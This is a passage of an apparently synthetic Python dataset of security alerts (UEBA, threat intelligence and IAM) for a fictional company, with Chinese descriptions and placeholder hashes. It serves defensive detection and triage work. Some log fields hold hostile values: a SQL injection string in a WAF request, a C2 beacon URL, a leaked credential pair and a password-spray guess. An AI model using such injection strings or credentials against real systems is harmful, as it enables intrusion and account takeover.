        "artifacts": [
            {"type": "hostname", "value": "WKS-HR-03"},
            {"type": "source_ip", "value": "192.168.2.150"},
            {"type": "file_change_count", "value": 250},
            {"type": "new_extension", "value": ".encrypted"}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T18:05:54.666Z",
            "event_type": "HostFileAnomaly",
            "entity_details": {"entity_name": "WKS-HR-03", "entity_type": "Workstation"},
            "behavioral_details": {
                "file_change_rate": 50,
                "file_change_rate_score": 9.9,
                "reason": "Mass file renaming/encryption pattern"
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-10-Account-Creation-Anomaly",
        "rule_name": "异常账户创建",
        "alert_date": "2025-09-23T20:45:10Z",
        "tags": ["account-management", "anomaly", "privilege-escalation"],
        "severity": "Medium",
        "reference": "非IT管理员账户创建新用户",
        "description": "非 IT 部门的管理员账户 n.jones 在非工作时间创建了一个新的高权限用户账户。此行为严重偏离了该账户的正常职责。",
        "artifacts": [
            {"type": "actor_username", "value": "n.jones"},
            {"type": "source_ip", "value": "192.168.1.120"},
            {"type": "action", "value": "user_creation"},
            {"type": "new_username", "value": "temp_admin_user"}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T20:45:09.111Z",
            "event_type": "AccountManagementAnomaly",
            "user_details": {"username": "n.jones", "department": "Facilities"},
            "behavioral_details": {
                "normal_activities": ["door-access-control", "HVAC-management"],
                "deviation_reason": "Out-of-scope user management activity"
            }
        }
    }
]
ti_alert = [
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-01-Malicious-IP-Inbound",
        "rule_name": "来自恶意IP的入站连接",
        "alert_date": "2025-09-23T20:50:00Z",
        "tags": ["malicious-ip", "reconnaissance", "botnet"],
        "severity": "High",
        "reference": "来自俄罗斯僵尸网络IP的扫描尝试",
        "description": "防火墙日志显示，来自一个已知僵尸网络基础设施的恶意 IP 地址 185.22.67.123 尝试连接到内部网络。",
        "artifacts": [
            {"type": "source_ip", "value": "185.22.67.123"},
            {"type": "destination_ip", "value": "10.10.10.50"},
            {"type": "country", "value": "Russia"},
            {"type": "threat_list", "value": "Botnet C2 IPs"}
        ],
        "raw_log": {
            "source_type": "Firewall",
            "timestamp": "2025-09-23T20:49:59.876Z",
            "action": "DENY",
            "protocol": "TCP",
            "src_ip": "185.22.67.123",
            "dst_ip": "10.10.10.50",
            "dst_port": 22,
            "rule_name": "deny_all_malicious_ips"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-02-C2-Domain-Outbound",
        "rule_name": "内部主机尝试连接C2域名",
        "alert_date": "2025-09-23T20:55:30Z",
        "tags": ["c2", "malware", "outbound"],
        "severity": "Critical",
        "reference": "主机WKS-HR-03连接到恶意C2域名",
        "description": "内部主机 WKS-HR-03 (192.168.2.150) 尝试通过代理服务器连接到一个被威胁情报标记为命令与控制 (C2) 服务器的域名。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.2.150"},
            {"type": "destination_domain", "value": "evil.c2-server.net"},
            {"type": "threat_list", "value": "APT C2 Domains"}
        ],
        "raw_log": {
            "source_type": "Proxy",
            "timestamp": "2025-09-23T20:55:29.987Z",
            "action": "BLOCK",
            "user": "j.smith",
            "src_ip": "192.168.2.150",
            "url": "http://evil.c2-server.net/beacon"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-03-Malicious-File-Hash-Match",
        "rule_name": "内部文件哈希匹配恶意情报",
        "alert_date": "2025-09-23T21:00:15Z",
        "tags": ["malware", "file-hash", "endpoint"],
        "severity": "High",
        "reference": "主机FIN-WKS-JDOE-05上发现恶意文件",
        "description": "终端日志显示，主机 FIN-WKS-JDOE-05 上存在一个文件的 SHA256 哈希值与一个已知的恶意软件（勒索软件）哈希值匹配。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "file_path", "value": "C:\\Users\\j.doe\\Downloads\\invoice.exe"},
            {"type": "file_hash_sha256", "value": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"},
            {"type": "threat_list", "value": "Ransomware Hashes"}
        ],
        "raw_log": {
            "source_type": "EDR",
            "timestamp": "2025-09-23T21:00:14.654Z",
            "event_name": "File_Creation_Detected",
            "file_hash_sha256": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
            "file_path": "C:\\Users\\j.doe\\Downloads\\invoice.exe"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-04-Phishing-URL-Access",
        "rule_name": "访问钓鱼URL",
        "alert_date": "2025-09-23T21:05:40Z",
        "tags": ["phishing", "url-threat"],
        "severity": "Medium",
        "reference": "用户d.chen访问钓鱼URL",
        "description": "用户 d.chen 访问了一个被威胁情报标记为钓鱼网站的 URL。虽然访问被允许，但该行为需要进一步调查。",
        "artifacts": [
            {"type": "username", "value": "d.chen"},
            {"type": "source_ip", "value": "192.168.4.12"},
            {"type": "url", "value": "http://my-corp-sso-secure.cc/login"},
            {"type": "threat_list", "value": "Phishing URLs"}
        ],
        "raw_log": {
            "source_type": "Proxy",
            "timestamp": "2025-09-23T21:05:39.111Z",
            "action": "ALLOW",
            "user": "d.chen",
            "src_ip": "192.168.4.12",
            "url": "http://my-corp-sso-secure.cc/login"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-05-Known-Vulnerability-Scan",
        "rule_name": "已知漏洞扫描活动",
        "alert_date": "2025-09-23T21:10:20Z",
        "tags": ["vulnerability", "scan", "reconnaissance"],
        "severity": "High",
        "reference": "来自IP 104.22.56.78的Log4j漏洞扫描",
        "description": "来自 IP 地址 104.22.56.78 的流量模式与 Log4j (CVE-2021-44228) 漏洞的扫描特征相匹配。该 IP 被列在恶意扫描者列表中。",
        "artifacts": [
            {"type": "source_ip", "value": "104.22.56.78"},
            {"type": "destination_ip", "value": "10.10.10.200"},
            {"type": "vulnerability", "value": "Log4j (CVE-2021-44228)"}
        ],
        "raw_log": {
            "source_type": "IPS/IDS",
            "timestamp": "2025-09-23T21:10:19.456Z",
            "action": "DROP",
            "src_ip": "104.22.56.78",
            "dst_ip": "10.10.10.200",
            "signature_id": "IDS_Log4j_Scan_Pattern"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-06-Data-Exfiltration-Endpoint-Match",
        "rule_name": "数据外泄端点连接",
        "alert_date": "2025-09-23T21:15:50Z",
        "tags": ["exfiltration", "data-theft"],
        "severity": "Medium",
        "reference": "主机WKS-ENG-12连接到数据外泄端点",
        "description": "主机 WKS-ENG-12 (192.168.4.12) 尝试连接到一个被标记为数据外泄端点的 IP 地址 45.33.20.10。",
        "artifacts": [
            {"type": "hostname", "value": "WKS-ENG-12"},
            {"type": "source_ip", "value": "192.168.4.12"},
            {"type": "destination_ip", "value": "45.33.20.10"},
            {"type": "threat_list", "value": "Data Exfiltration Endpoints"}
        ],
        "raw_log": {
            "source_type": "Firewall",
            "timestamp": "2025-09-23T21:15:49.123Z",
            "action": "BLOCK",
            "src_ip": "192.168.4.12",
            "dst_ip": "45.33.20.10",
            "dst_port": 80
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-07-Malicious-Domain-DNS-Query",
        "rule_name": "DNS查询恶意域名",
        "alert_date": "2025-09-23T21:20:10Z",
        "tags": ["dns", "malware"],
        "severity": "Medium",
        "reference": "主机IT-ADMIN-01查询恶意域名",
        "description": "IT-ADMIN-01 (192.168.10.5) 主机向内部 DNS 服务器查询了一个被列为恶意软件分发站点的域名。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.10.5"},
            {"type": "query_domain", "value": "malware-repo.xyz"},
            {"type": "threat_list", "value": "Malware Drop Zones"}
        ],
        "raw_log": {
            "source_type": "DNS",
            "timestamp": "2025-09-23T21:20:09.543Z",
            "src_ip": "192.168.10.5",
            "query_domain": "malware-repo.xyz",
            "response": "blocked"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-08-Suspicious-Country-Access",
        "rule_name": "来自受限制国家的连接",
        "alert_date": "2025-09-23T21:25:00Z",
        "tags": ["geofencing", "risk-country"],
        "severity": "Low",
        "reference": "来自受限制国家朝鲜的连接尝试",
        "description": "来自 IP 地址 175.45.176.1 的连接尝试，该 IP 归属于一个被公司安全策略列为高风险或受限制的国家/地区（朝鲜）。",
        "artifacts": [
            {"type": "source_ip", "value": "175.45.176.1"},
            {"type": "country", "value": "North Korea"}
        ],
        "raw_log": {
            "source_type": "Firewall",
            "timestamp": "2025-09-23T21:24:59.000Z",
            "action": "DENY",
            "src_ip": "175.45.176.1",
            "dst_ip": "52.8.10.20",
            "dst_port": 443,
            "rule_name": "geo_block_north_korea"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-09-Compromised-Account-Credential",
        "rule_name": "内部账户凭据出现在暗网",
        "alert_date": "2025-09-23T21:30:35Z",
        "tags": ["compromised-credentials", "darkweb", "insider-threat"],
        "severity": "High",
        "reference": "账户l.wang的凭据出现在暗网数据库",
        "description": "威胁情报源报告，用户 l.wang (l.wang@mycorp.com) 的凭据（用户名和密码）在一个已泄露的暗网数据库中被发现。",
        "artifacts": [
            {"type": "username", "value": "l.wang"},
            {"type": "email", "value": "l.wang@mycorp.com"},
            {"type": "leak_source", "value": "Dark Web Credential Dump"}
        ],
        "raw_log": {
            "source_type": "Threat Intelligence Feed",
            "timestamp": "2025-09-23T21:30:34.888Z",
            "alert_source": "credential-monitoring-service",
            "details": "Credential 'l.wang@mycorp.com:password123' found in pastebin dump."
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-10-Honeypot-Interaction",
        "rule_name": "与公司蜜罐交互",
        "alert_date": "2025-09-23T21:35:10Z",
        "tags": ["honeypot", "attacker-activity", "reconnaissance"],
        "severity": "Medium",
        "reference": "IP 1.1.1.1与蜜罐服务进行交互",
        "description": "IP 地址 1.1.1.1 (可能为攻击者) 与公司内部的蜜罐服务建立了连接。该行为表示有针对性的侦察或攻击尝试。",
        "artifacts": [
            {"type": "source_ip", "value": "1.1.1.1"},
            {"type": "destination_ip", "value": "10.10.10.250"},
            {"type": "device_type", "value": "Honeypot"}
        ],
        "raw_log": {
            "source_type": "Honeypot",
            "timestamp": "2025-09-23T21:35:09.999Z",
            "action": "ATTEMPTED_ACCESS",
            "src_ip": "1.1.1.1",
            "dst_ip": "10.10.10.250",
            "dst_port": 21,
            "service": "ftp"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-11-Malicious-IP-Outbound",
        "rule_name": "内部主机连接到恶意IP",
        "alert_date": "2025-09-23T21:40:05Z",
        "tags": ["malicious-ip", "outbound", "botnet"],
        "severity": "High",
        "reference": "主机WKS-HR-03尝试连接到恶意IP",
        "description": "主机 WKS-HR-03 (192.168.2.150) 尝试连接到一个被列为恶意基础设施的 IP 地址 5.6.7.8。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.2.150"},
            {"type": "destination_ip", "value": "5.6.7.8"},
            {"type": "threat_list", "value": "Malicious IPs"}
        ],
        "raw_log": {
            "source_type": "Firewall",
            "timestamp": "2025-09-23T21:40:04.999Z",
            "action": "DENY",
            "src_ip": "192.168.2.150",
            "dst_ip": "5.6.7.8",
            "dst_port": 443
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-12-Suspicious-URL-Inbound",
        "rule_name": "入站邮件中的可疑URL",
        "alert_date": "2025-09-23T21:45:30Z",
        "tags": ["phishing", "email"],
        "severity": "Medium",
        "reference": "邮件中检测到可疑URL",
        "description": "邮件安全网关检测到一封入站邮件中包含一个被威胁情报标记为可疑或钓鱼的 URL。",
        "artifacts": [
            {"type": "sender_email", "value": "noreply@sso-update.com"},
            {"type": "url", "value": "https://sso-update.mycorp.io"},
            {"type": "threat_list", "value": "Suspicious URLs"}
        ],
        "raw_log": {
            "source_type": "Email Gateway",
            "timestamp": "2025-09-23T21:45:29.876Z",
            "action": "QUARANTINE",
            "sender": "noreply@sso-update.com",
            "recipient": "j.doe@mycorp.com",
            "subject": "Important Security Notice",
            "body_snippet": "Please update your password via this link: https://sso-update.mycorp.io"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-13-Known-Attacker-IP",
        "rule_name": "与已知攻击者IP的交互",
        "alert_date": "2025-09-23T21:50:00Z",
        "tags": ["apt", "attacker", "reconnaissance"],
        "severity": "Critical",
        "reference": "来自APT组织IP的扫描",
        "description": "来自一个被确定为APT（高级持续威胁）组织使用的 IP 地址 103.203.20.12 的流量被检测到。",
        "artifacts": [
            {"type": "source_ip", "value": "103.203.20.12"},
            {"type": "threat_actor", "value": "Fancy Bear"}
        ],
        "raw_log": {
            "source_type": "IPS/IDS",
            "timestamp": "2025-09-23T21:49:59.000Z",
            "action": "ALERT",
            "src_ip": "103.203.20.12",
            "dst_ip": "10.10.10.50",
            "signature_id": "IDS_Known_APT_Scan"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-14-Ransomware-Hash-Downloaded",
        "rule_name": "勒索软件哈希被下载",
        "alert_date": "2025-09-23T21:55:45Z",
        "tags": ["ransomware", "download", "endpoint"],
        "severity": "Critical",
        "reference": "主机MKT-WKS-ASMITH-01下载勒索软件文件",
        "description": "终端日志显示，主机 MKT-WKS-ASMITH-01 上下载的一个文件与一个已知的勒索软件哈希值匹配。",
        "artifacts": [
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "file_hash_sha256", "value": "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2"},
            {"type": "file_path", "value": "C:\\Users\\a.smith\\Downloads\\document.zip"}
        ],
        "raw_log": {
            "source_type": "EDR",
            "timestamp": "2025-09-23T21:55:44.888Z",
            "event_name": "File_Download_Detected",
            "file_hash_sha256": "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2",
            "file_path": "C:\\Users\\a.smith\\Downloads\\document.zip"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-15-Cryptocurrency-Miner-Domain",
        "rule_name": "加密货币挖矿域名连接",
        "alert_date": "2025-09-23T22:00:20Z",
        "tags": ["cryptomining", "malware"],
        "severity": "Medium",
        "reference": "主机FIN-WKS-JDOE-05连接到加密货币挖矿池",
        "description": "主机 FIN-WKS-JDOE-05 尝试连接到一个被威胁情报标记为加密货币挖矿池的域名。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_domain", "value": "mine-xmr.pool.net"}
        ],
        "raw_log": {
            "source_type": "Proxy",
            "timestamp": "2025-09-23T22:00:19.999Z",
            "action": "BLOCK",
            "user": "j.doe",
            "src_ip": "192.168.1.101",
            "url": "http://mine-xmr.pool.net/miner"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-16-Dark-Web-Mention",
        "rule_name": "公司信息出现在暗网",
        "alert_date": "2025-09-23T22:05:00Z",
        "tags": ["darkweb", "intel", "breach"],
        "severity": "High",
        "reference": "暗网论坛提及公司名称和泄露数据",
        "description": "在暗网的一个黑客论坛上，公司名称 'MyCorp' 被提及，并附有泄露员工数据的链接。",
        "artifacts": [
            {"type": "company_name", "value": "MyCorp"},
            {"type": "leak_type", "value": "Employee Data"}
        ],
        "raw_log": {
            "source_type": "Dark Web Monitor",
            "timestamp": "2025-09-23T22:04:59.000Z",
            "details": "Post on 'Breach Forums' discussing 'MyCorp' and 'staff email list'"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-17-Malicious-IP-Port-Scan",
        "rule_name": "来自恶意IP的端口扫描",
        "alert_date": "2025-09-23T22:10:30Z",
        "tags": ["malicious-ip", "reconnaissance", "port-scan"],
        "severity": "Medium",
        "reference": "来自IP 134.119.50.60的大规模端口扫描",
        "description": "来自一个已知恶意 IP 的 134.119.50.60 对内部资产进行大规模端口扫描，试图发现开放的服务。",
        "artifacts": [
            {"type": "source_ip", "value": "134.119.50.60"},
            {"type": "destination_ip", "value": "10.10.10.0/24"},
            {"type": "threat_list", "value": "Malicious Scanners"}
        ],
        "raw_log": {
            "source_type": "IPS/IDS",
            "timestamp": "2025-09-23T22:10:29.876Z",
            "action": "ALERT",
            "src_ip": "134.119.50.60",
            "dst_ip": "10.10.10.10, 10.10.10.20, ...",
            "signature_id": "Port_Scan_TCP_Syn"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-18-Spear-Phishing-Email-Detected",
        "rule_name": "鱼叉式网络钓鱼邮件检测",
        "alert_date": "2025-09-23T22:15:15Z",
        "tags": ["spear-phishing", "email"],
        "severity": "High",
        "reference": "针对CEO的鱼叉式钓鱼邮件",
        "description": "一封针对 CEO (j.smith@mycorp.com) 的鱼叉式钓鱼邮件，该邮件模仿了客户公司的通信，并包含一个恶意附件。",
        "artifacts": [
            {"type": "recipient_email", "value": "j.smith@mycorp.com"},
            {"type": "sender_email", "value": "info@customer-relations-co.org"},
            {"type": "subject", "value": "Regarding Q3 contract renewal"}
        ],
        "raw_log": {
            "source_type": "Email Gateway",
            "timestamp": "2025-09-23T22:15:14.666Z",
            "action": "BLOCK",
            "sender": "info@customer-relations-co.org",
            "recipient": "j.smith@mycorp.com",
            "subject": "Regarding Q3 contract renewal",
            "threat_details": "Targeted phishing, known malicious sender, attachment scan"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-19-Vulnerability-Exploit-Attempt",
        "rule_name": "已知漏洞利用尝试",
        "alert_date": "2025-09-23T22:20:00Z",
        "tags": ["vulnerability", "exploit", "attack"],
        "severity": "Critical",
        "reference": "针对Web服务器的SQL注入尝试",
        "description": "Web 应用防火墙 (WAF) 检测到针对 Web 服务器 (10.10.10.100) 的一个 SQL 注入尝试，该模式与已知的攻击工具和方法相符。",
        "artifacts": [
            {"type": "source_ip", "value": "172.67.100.200"},
            {"type": "destination_ip", "value": "10.10.10.100"},
            {"type": "attack_type", "value": "SQL Injection"}
        ],
        "raw_log": {
            "source_type": "WAF",
            "timestamp": "2025-09-23T22:19:59.123Z",
            "action": "BLOCK",
            "src_ip": "172.67.100.200",
            "dst_ip": "10.10.10.100",
            "request_uri": "/api/users?id=' OR 1=1 --",
            "rule_id": "WAF_SQLI_Rule_01"
        }
    },
    {
        "source": "Threat Intelligence",
        "rule_id": "TI-Rule-20-Social-Media-Threat-Mention",
        "rule_name": "公司在社交媒体被提及为攻击目标",
        "alert_date": "2025-09-23T22:25:00Z",
        "tags": ["social-media", "intel", "targeting"],
        "severity": "Medium",
        "reference": "Twitter上提及公司为即将攻击目标",
        "description": "在公共社交媒体平台（Twitter）上，一个可疑账户发布了关于将 'MyCorp' 作为即将攻击目标的帖子。",
        "artifacts": [
            {"type": "platform", "value": "Twitter"},
            {"type": "mention_text", "value": "MyCorp is next. #breach"},
            {"type": "threat_actor_alias", "value": "CyberViking"}
        ],
        "raw_log": {
            "source_type": "Social Media Monitor",
            "timestamp": "2025-09-23T22:24:59.000Z",
            "details": "Tweet by user @CyberViking: 'MyCorp is next. #breach #hack'"
        }
    }
]

iam_alert = [
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-01-Excessive-Permission-Grant",
        "rule_name": "账户权限异常提升",
        "alert_date": "2025-09-23T23:05:00Z",
        "tags": ["privilege-escalation", "iam", "access-anomaly"],
        "severity": "High",
        "reference": "用户j.doe账户被授予敏感管理员权限",
        "description": "用户 j.doe 的账户被授予 'Global Administrator' 权限。此权限提升发生在非IT管理员的操作下，且不符合其日常工作职责，可能表明特权提升攻击。",
        "artifacts": [
            {"type": "username", "value": "j.doe"},
            {"type": "actor_account", "value": "l.smith"},
            {"type": "permission_granted", "value": "Global Administrator"},
            {"type": "platform", "value": "Azure AD"}
        ],
        "raw_log": {
            "service": "Azure AD",
            "timestamp": "2025-09-23T23:04:59.888Z",
            "event_type": "RoleAssignment",
            "actor": {"user_id": "l.smith"},
            "target": {"user_id": "j.doe"},
            "details": {"role": "Global Administrator", "reason": "Unjustified elevation"}
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-02-Impossible-Travel-Login",
        "rule_name": "异地登录（不可能行程）",
        "alert_date": "2025-09-23T23:10:30Z",
        "tags": ["impossible-travel", "geolocation", "compromised-account"],
        "severity": "High",
        "reference": "用户c.jones账户在两地同时登录",
        "description": "用户 c.jones 的账户在 10 分钟内分别从美国和日本登录。这在物理上是不可能的，强烈表明账户已被盗用。",
        "artifacts": [
            {"type": "username", "value": "c.jones"},
            {"type": "login_1_ip", "value": "198.51.100.25"},
            {"type": "login_1_location", "value": "New York, USA"},
            {"type": "login_2_ip", "value": "203.0.113.50"},
            {"type": "login_2_location", "value": "Tokyo, Japan"}
        ],
        "raw_log": {
            "service": "Okta",
            "timestamp": "2025-09-23T23:10:29.987Z",
            "event_type": "AuthenticationSuccess",
            "user": {"username": "c.jones"},
            "geolocations": [{"country": "USA", "ip": "198.51.100.25"}, {"country": "Japan", "ip": "203.0.113.50"}],
            "details": {"time_between_logins_min": 10}
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-03-Brute-Force-Attack-Password-Spraying",
        "rule_name": "多账户密码喷洒攻击",
        "alert_date": "2025-09-23T23:15:20Z",
        "tags": ["brute-force", "password-spraying", "authentication"],
        "severity": "High",
        "reference": "来自IP 104.22.56.78的密码喷洒攻击",
        "description": "来自单个 IP 地址 104.22.56.78 对多个用户账户进行了大量的失败登录尝试。该攻击模式与密码喷洒攻击一致。",
        "artifacts": [
            {"type": "source_ip", "value": "104.22.56.78"},
            {"type": "failed_logins", "value": 50},
            {"type": "target_user_count", "value": 10}
        ],
        "raw_log": {
            "service": "Active Directory",
            "timestamp": "2025-09-23T23:15:19.444Z",
            "event_type": "AuthenticationFailure",
            "src_ip": "104.22.56.78",
            "details": {"target_users": ["j.doe", "a.smith", "c.jones", "..."], "password_attempted": "Spring2025!"}
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-04-New-Privileged-Account-Created",
        "rule_name": "非授权创建特权账户",
        "alert_date": "2025-09-23T23:20:55Z",
        "tags": ["account-creation", "privileged-account", "insider-threat"],
        "severity": "Medium",
        "reference": "非IT管理员账户创建新管理员用户",
        "description": "非 IT 部门的管理员账户 s.brown 在非工作时间创建了一个新的高权限用户账户，名为 'temp_admin_user'。",
        "artifacts": [
            {"type": "actor_username", "value": "s.brown"},
            {"type": "new_username", "value": "temp_admin_user"},
            {"type": "source_ip", "value": "192.168.1.55"},
            {"type": "time_of_day", "value": "After-hours"}
        ],
        "raw_log": {
            "service": "Active Directory",
            "timestamp": "2025-09-23T23:20:54.666Z",
            "event_type": "UserCreation",
            "actor": {"username": "s.brown", "department": "Facilities"},
            "target": {"username": "temp_admin_user", "groups": ["Domain Admins"]}
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-05-Unusual-API-Call-Cloud",
        "rule_name": "云服务账户异常API调用",
        "alert_date": "2025-09-23T23:25:40Z",
        "tags": ["cloud-security", "iam", "api-call-anomaly"],
        "severity": "High",
        "reference": "AWS账户'App-Service'在异常地点调用API",
        "description": "AWS 服务账户 'App-Service' 通常仅从美国东部地区发起 API 调用，但现在却从欧洲地区发起了异常的 'EC2 StartInstances' API 调用。",
        "artifacts": [
            {"type": "account_name", "value": "App-Service"},
            {"type": "api_call", "value": "EC2:StartInstances"},
            {"type": "source_region", "value": "eu-west-1"},
            {"type": "normal_region", "value": "us-east-1"}
        ],
        "raw_log": {
            "service": "AWS CloudTrail",
            "timestamp": "2025-09-23T23:25:39.111Z",
            "event_name": "StartInstances",
            "user_identity": {"type": "AssumedRole", "principal_id": "App-Service"},
            "source_ip_address": "85.234.11.22",
            "aws_region": "eu-west-1"
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-06-Multiple-Failed-MFA-Attempts",
        "rule_name": "多因素认证失败尝试",
        "alert_date": "2025-09-23T23:30:10Z",
        "tags": ["mfa", "authentication", "brute-force"],
        "severity": "Medium",
        "reference": "用户h.lin多次尝试失败的MFA验证",
        "description": "用户 h.lin 在短时间内多次尝试失败的多因素认证（MFA）。这可能表明攻击者已经窃取了其密码，并正在尝试绕过 MFA。",
        "artifacts": [
            {"type": "username", "value": "h.lin"},
            {"type": "failed_attempts", "value": 5},
            {"type": "source_ip", "value": "203.0.113.100"},
            {"type": "mfa_method", "value": "TOTP"}
        ],
        "raw_log": {
            "service": "Okta",
            "timestamp": "2025-09-23T23:30:09.543Z",
            "event_type": "AuthenticationFailure",
            "user": {"username": "h.lin"},
            "details": {"reason": "MFA challenge failed", "mfa_method": "TOTP"}
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-07-Admin-Password-Reset-Anomaly",
        "rule_name": "管理员账户密码重置异常",
        "alert_date": "2025-09-23T23:35:00Z",
        "tags": ["privileged-account", "password-reset", "compromised-account"],
        "severity": "Critical",
        "reference": "管理员账户k.smith在异常时间被重置密码",
        "description": "管理员账户 k.smith 的密码在非工作时间被重置，且重置请求来自一个不属于正常管理员工作站的 IP 地址。",
        "artifacts": [
            {"type": "username", "value": "k.smith"},
            {"type": "source_ip", "value": "192.168.10.20"},
            {"type": "time_of_day", "value": "After-hours"}
        ],
        "raw_log": {
            "service": "Active Directory",
            "timestamp": "2025-09-23T23:34:59.000Z",
            "event_type": "PasswordReset",
            "user": {"username": "k.smith"},
            "details": {"action_by_ip": "192.168.10.20", "action_by_user": "SERVICE_ACCOUNT_PRV"}
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-08-New-User-Accessing-Sensitive-Data",
        "rule_name": "新创建用户访问敏感数据",
        "alert_date": "2025-09-23T23:40:15Z",
        "tags": ["new-user", "insider-threat", "data-exfiltration"],
        "severity": "Medium",
        "reference": "新用户n.jones创建后立即访问敏感数据",
        "description": "新创建的用户 n.jones 在其账户创建后 1 小时内，尝试访问一个包含客户 PII 的文件服务器。此行为与新员工的正常入职流程不符。",
        "artifacts": [
            {"type": "username", "value": "n.jones"},
            {"type": "source_ip", "value": "192.168.2.150"},
            {"type": "resource", "value": "FileServer-HR-PII"}
        ],
        "raw_log": {
            "service": "File Server",
            "timestamp": "2025-09-23T23:40:14.999Z",
            "event_type": "FileAccess",
            "user": {"username": "n.jones"},
            "file_path": "/sensitive/hr/pii/customers.xlsx",
            "access_result": "Denied"
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-09-Service-Account-Interactive-Login",
        "rule_name": "服务账户异常交互式登录",
        "alert_date": "2025-09-23T23:45:30Z",
        "tags": ["service-account", "anomaly", "lateral-movement"],
        "severity": "High",
        "reference": "服务账户SVC-APP-01在工作站进行登录",
        "description": "服务账户 'SVC-APP-01' 通常仅用于自动化进程，但现在却在工作站上进行了交互式登录。这强烈表明账户已被攻击者盗用。",
        "artifacts": [
            {"type": "account_name", "value": "SVC-APP-01"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "login_type", "value": "Interactive"}
        ],
        "raw_log": {
            "service": "Active Directory",
            "timestamp": "2025-09-23T23:45:29.876Z",
            "event_type": "LoginSuccess",
            "user": {"username": "SVC-APP-01"},
            "src_ip": "192.168.1.101",
            "login_type": "Interactive"
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-10-Account-Creation-Followed-by-Compromise",
        "rule_name": "新账户创建后立即被盗用",
        "alert_date": "2025-09-23T23:50:00Z",
        "tags": ["account-compromise", "new-user", "suspicious-activity"],
        "severity": "High",
        "reference": "新账户'temp_admin_user'被创建后立即登录异地",
        "description": "新创建的账户 'temp_admin_user' 在其创建后 10 分钟内，从一个异常的外部 IP 地址 203.0.113.20 进行了首次登录。这表明该账户可能被恶意创建并立即被盗用。",
        "artifacts": [
            {"type": "username", "value": "temp_admin_user"},
            {"type": "login_ip", "value": "203.0.113.20"},
            {"type": "time_since_creation_min", "value": 10}
        ],
        "raw_log": {
            "service": "Active Directory",
            "timestamp": "2025-09-23T23:50:00.000Z",
            "event_type": "LoginSuccess",
            "user": {"username": "temp_admin_user"},
            "src_ip": "203.0.113.20"
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-11-High-Frequency-Access-Denied",
        "rule_name": "账户高频访问拒绝",
        "alert_date": "2025-09-23T23:55:10Z",
        "tags": ["reconnaissance", "lateral-movement", "access-denied"],
        "severity": "Medium",
        "reference": "用户a.smith高频访问被拒绝的资源",
        "description": "用户 a.smith 在短时间内对多个权限不足的资源进行了高频访问尝试。这可能是攻击者在进行侦察，试图发现可利用的权限。",
        "artifacts": [
            {"type": "username", "value": "a.smith"},
            {"type": "source_ip", "value": "192.168.2.54"},
            {"type": "denied_attempts", "value": 30},
            {"type": "time_window_sec", "value": 60}
        ],
        "raw_log": {
            "service": "File Server",
            "timestamp": "2025-09-23T23:55:09.123Z",
            "event_type": "AccessDenied",
            "user": {"username": "a.smith"},
            "resource_list": ["/finance/docs/", "/hr/payroll/", "/ceo/private/"],
            "access_result": "Denied"
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-12-Shared-Credential-Used-Unusual-Context",
        "rule_name": "共享凭据异常使用",
        "alert_date": "2025-09-24T00:00:20Z",
        "tags": ["shared-account", "anomaly", "lateral-movement"],
        "severity": "Low",
        "reference": "共享账户'Guest-User'在异常时间登录",
